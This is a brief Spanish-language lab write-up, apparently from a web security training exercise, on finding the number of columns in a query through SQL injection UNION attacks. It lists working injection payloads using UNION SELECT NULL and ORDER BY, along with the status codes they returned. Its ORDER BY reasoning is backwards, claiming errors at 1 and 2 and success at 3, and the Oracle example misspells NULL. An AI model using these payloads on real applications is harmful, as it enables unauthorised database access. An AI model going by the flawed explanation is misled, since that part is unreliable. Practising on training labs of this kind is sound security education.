## SQL injection UNION attack, determining the number of columns returned by the query
### INFO DEL LAB 
El lab tiene una vulnerabilidad sql injection en el filtro de categorias de productos.  
Objetivo: Determinar el numero de columnas y el las filas que tienen valor NULL..  
En este caso tratamos con una sentenciaa UNION de sql.

### ANALISIS  
Al ser un UNION tendremos dos tablas:  
tabla1   tabla2
------   ------  
a | b    c | d   
-----    ------  
1 , 2    2 , 3  
3 , 4    4 , 5  


Vector de ataque 1:  
Usando 'UNION SELECT NULL --  
vamos probando la existencia de las columnas: 
'UNION SELECT NULL -- obtenemos codigo 400
'UNION SELECT NULL,NULL -- obtenemos codigo 400  
'UNION SELECT NULL,NULL,NULL -- obtenemos codigo 200 lo que indica que tiene 3 columnas. 
En caso de ser una BD Oracle usariamos la sintaxis 'UNION SELECT NUULL FROM DUAL--  

Vector de ataque 2:  
' order by 1--  obtenemos codigo 400  
' order by 2--  obtenemos codigo 400 
' order by 3--  obtenemos codigo 200
Asi sabriamos que son 3 columnas.  


### RESOLUCION   
```sh  
' order by 3--  obtenemos codigo 200  
o  
'UNION SELECT NULL,NULL,NULL --  
```
